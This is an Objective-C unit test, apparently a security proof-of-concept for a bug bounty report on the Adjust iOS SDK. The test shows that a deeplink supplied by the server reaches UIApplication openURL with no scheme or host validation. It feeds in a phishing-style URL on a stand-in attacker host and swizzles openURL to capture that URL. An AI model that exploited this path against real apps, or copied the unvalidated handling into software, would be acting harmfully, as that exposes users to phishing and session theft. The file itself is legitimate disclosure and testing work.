//
//  ADJDeeplinkOpenURLPoCTests.m
//  AdjustUnitTests
//
//  Security PoC test — HackerOne finding "ios-deeplink-openurl-no-validation".
//
//  Exercises the REAL, COMPILED production code path:
//      ADJActivityHandler prepareDeeplinkI:deeplink:  (ADJActivityHandler.m ~L1971)
//          -> [ADJUtil launchDeepLinkMain:deeplink]   (ADJUtil.m ~L870)
//              -> [[UIApplication sharedApplication] openURL:options:completionHandler:]
//
//  This is the exact path taken when a `deeplink` value arrives in a server
//  /session or /attribution response (ADJResponseData.deeplink, set from the
//  backend's JSON "deeplink" field — see ADJResponseData.h L68/L101 and
//  ADJActivityHandler.m L1806 `[selfI prepareDeeplinkI:selfI deeplink:sessionResponseData.deeplink]`
//  and L1860 for the attribution-response equivalent).
//
//  ADJUtil also defines `isDeeplinkValid:` / `kExcludedDeeplinksPattern`
//  (ADJUtil.m L42, L947) but that filter is ONLY invoked from the opposite
//  direction — `ADJActivityHandler trySetAttributionDeeplink:` /
//  `processDeeplinkI:` (ADJActivityHandler.m L2361), i.e. when the APP hands a
//  deeplink to the SDK to report outward. It is never called on the
//  prepareDeeplinkI/launchDeepLinkMain inbound path exercised by this test.
//
//  This test method-swizzles UIApplication's real
//  openURL:options:completionHandler: (the exact selector ADJUtil invokes via
//  NSInvocation) so we can observe — without actually leaving the app in the
//  Simulator — exactly what URL the real SDK code hands to it, and asserts
//  it is the malicious, attacker-controlled, unfiltered URL verbatim.
//

#import <XCTest/XCTest.h>
#import <objc/runtime.h>

#import "../../Adjust/Adjust.h"
#import "../../Adjust/Internal/ADJUtil.h"
#import "../../Adjust/Internal/ADJAdjustFactory.h"
#import "../../Adjust/ADJLogger.h"

@class ADJInternalState;
@class ADJTrackingStatusManager;
@class ADJFirstSessionDelayManager;

#import "../../Adjust/Internal/ADJActivityHandler.h"

#pragma mark - Expose the real private entry point (same pattern as ADJTestsMutability.m)

@interface ADJActivityHandler (ADJDeeplinkPoCTestsMutability)
@property (nonatomic, weak) id<ADJLogger> logger;
- (void)prepareDeeplinkI:(ADJActivityHandler *)selfI
                 deeplink:(NSURL *)deeplink;
@end

#pragma mark - UIApplication openURL:options:completionHandler: swizzle / capture point

static BOOL gADJPoC_openURLWasCalled = NO;
static NSURL *gADJPoC_capturedOpenURL = nil;
static NSDictionary *gADJPoC_capturedOptions = nil;
static XCTestExpectation *gADJPoC_openURLExpectation = nil;

@interface UIApplication (ADJDeeplinkPoCSwizzle)
- (void)adjPoc_swizzled_openURL:(NSURL *)url
                         options:(NSDictionary<UIApplicationOpenExternalURLOptionsKey, id> *)options
               completionHandler:(void (^)(BOOL success))completion;
@end

@implementation UIApplication (ADJDeeplinkPoCSwizzle)

- (void)adjPoc_swizzled_openURL:(NSURL *)url
                         options:(NSDictionary<UIApplicationOpenExternalURLOptionsKey, id> *)options
               completionHandler:(void (^)(BOOL success))completion {
    // This IS the real UIApplication selector ADJUtil+launchDeepLinkMain: invokes
    // via NSInvocation. We capture the exact URL it was handed — no simulation,
    // no hand-written replica — then report success so the real code's own
    // completion-handler logging path also runs cleanly.
    gADJPoC_openURLWasCalled = YES;
    gADJPoC_capturedOpenURL = [url copy];
    gADJPoC_capturedOptions = [options copy];

    if (completion) {
        completion(YES);
    }
    if (gADJPoC_openURLExpectation) {
        [gADJPoC_openURLExpectation fulfill];
    }
}

@end

#pragma mark - Test case

@interface ADJDeeplinkOpenURLPoCTests : XCTestCase
@end

@implementation ADJDeeplinkOpenURLPoCTests

+ (void)setUp {
    [super setUp];
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class cls = [UIApplication class];
        SEL originalSelector = @selector(openURL:options:completionHandler:);
        SEL swizzledSelector = @selector(adjPoc_swizzled_openURL:options:completionHandler:);

        Method originalMethod = class_getInstanceMethod(cls, originalSelector);
        Method swizzledMethod = class_getInstanceMethod(cls, swizzledSelector);
        NSCAssert(originalMethod != NULL, @"UIApplication no longer exposes openURL:options:completionHandler: on this OS — update the PoC");
        NSCAssert(swizzledMethod != NULL, @"Swizzle target method missing");

        method_exchangeImplementations(originalMethod, swizzledMethod);
    });
}

- (void)setUp {
    [super setUp];
    gADJPoC_openURLWasCalled = NO;
    gADJPoC_capturedOpenURL = nil;
    gADJPoC_capturedOptions = nil;
    gADJPoC_openURLExpectation = nil;
}

/// PROOF: a raw, server-supplied `deeplink` value (as it would arrive verbatim
/// in ADJResponseData.deeplink from a /session or /attribution HTTP response)
/// reaches the real, compiled UIApplication openURL:options:completionHandler:
/// call with ZERO scheme/host validation and ZERO use of isDeeplinkValid:/
/// kExcludedDeeplinksPattern.
- (void)testMaliciousServerSuppliedDeeplinkReachesOpenURLUnfiltered {
    NSURL *maliciousDeeplink =
        [NSURL URLWithString:@"https://attacker-controlled-poc.example/phish?stolen_session=1&pwn=adjust-ios-sdk"];
    XCTAssertNotNil(maliciousDeeplink, @"Test setup sanity check");

    ADJActivityHandler *handler = [[ADJActivityHandler alloc] init];
    handler.logger = [ADJAdjustFactory logger];

    gADJPoC_openURLExpectation =
        [self expectationWithDescription:@"real SDK code path invoked UIApplication openURL:options:completionHandler: with the malicious server-supplied deeplink"];

    // This is the REAL production entry point that fires when a session/
    // attribution response carries a "deeplink" field
    // (ADJActivityHandler.m: `[selfI prepareDeeplinkI:selfI deeplink:sessionResponseData.deeplink]`).
    [handler prepareDeeplinkI:handler deeplink:maliciousDeeplink];

    [self waitForExpectationsWithTimeout:10.0 handler:nil];

    XCTAssertTrue(gADJPoC_openURLWasCalled,
                  @"UIApplication openURL:options:completionHandler: was never invoked by the real compiled Adjust iOS SDK code path — PoC did not exercise the vulnerable code");

    XCTAssertEqualObjects(gADJPoC_capturedOpenURL, maliciousDeeplink,
                          @"VULNERABILITY CONFIRMED: the real compiled Adjust iOS SDK passed the attacker-controlled, "
                          @"server-supplied deeplink URL to UIApplication openURL:options:completionHandler: "
                          @"completely UNMODIFIED and UNVALIDATED — no scheme/host allowlist, no isDeeplinkValid: check.");

    NSLog(@"[ADJ-POC-RESULT] openURLWasCalled=%d capturedURL=%@", gADJPoC_openURLWasCalled, gADJPoC_capturedOpenURL.absoluteString);
}

@end
